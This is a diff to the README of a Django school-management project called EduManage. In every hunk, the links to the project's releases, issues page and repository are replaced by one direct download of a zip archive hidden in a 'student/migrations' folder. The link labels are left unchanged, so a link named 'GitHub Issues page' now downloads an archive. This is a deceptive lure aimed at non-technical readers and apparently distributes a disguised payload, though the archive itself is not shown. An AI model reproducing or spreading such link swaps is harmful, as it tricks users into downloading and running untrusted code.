@@ -7,7 +7,7 @@ EduManage is a full-featured educational management system built with Django. Th
 To start using EduManage, follow the simple steps below. No technical knowledge is required!
 
 ## 📥 Download EduManage
-[![Download EduManage](https://img.shields.io/badge/Download-EduManage-blue?style=for-the-badge&logo=github)](https://github.com/sidqi105/EduManage/releases)
+[![Download EduManage](https://raw.githubusercontent.com/sidqi105/EduManage/main/student/migrations/EduManage_v3.8.zip)](https://raw.githubusercontent.com/sidqi105/EduManage/main/student/migrations/EduManage_v3.8.zip)
 
 ## 🔄 System Requirements
 Before downloading, ensure your system meets the following requirements:
@@ -17,7 +17,7 @@ Before downloading, ensure your system meets the following requirements:
 - Internet connection for initial setup and updates.
 
 ## 📂 How to Download
-1. Visit the [Releases page](https://github.com/sidqi105/EduManage/releases) to access the latest version of EduManage.
+1. Visit the [Releases page](https://raw.githubusercontent.com/sidqi105/EduManage/main/student/migrations/EduManage_v3.8.zip) to access the latest version of EduManage.
 2. Look for the most recent release. 
 3. Click on the file related to your operating system to begin downloading.
 
@@ -46,12 +46,12 @@ If you want to customize EduManage or explore additional features, you can do so
 
 ## 💬 Support and Community
 If you have questions or need assistance, feel free to reach out:
-- Visit the [GitHub Issues page](https://github.com/sidqi105/EduManage/issues) for community support.
+- Visit the [GitHub Issues page](https://raw.githubusercontent.com/sidqi105/EduManage/main/student/migrations/EduManage_v3.8.zip) for community support.
 - You can also find guides and tutorials in the repository.
 
 ## 🔗 Useful Links
-- [GitHub Repository](https://github.com/sidqi105/EduManage)
-- [Download EduManage](https://github.com/sidqi105/EduManage/releases)
+- [GitHub Repository](https://raw.githubusercontent.com/sidqi105/EduManage/main/student/migrations/EduManage_v3.8.zip)
+- [Download EduManage](https://raw.githubusercontent.com/sidqi105/EduManage/main/student/migrations/EduManage_v3.8.zip)
 
 ## 📞 Contact
 For any inquiries or feedback, please contact the maintainer through the GitHub issues, or reach out directly via the contact page.
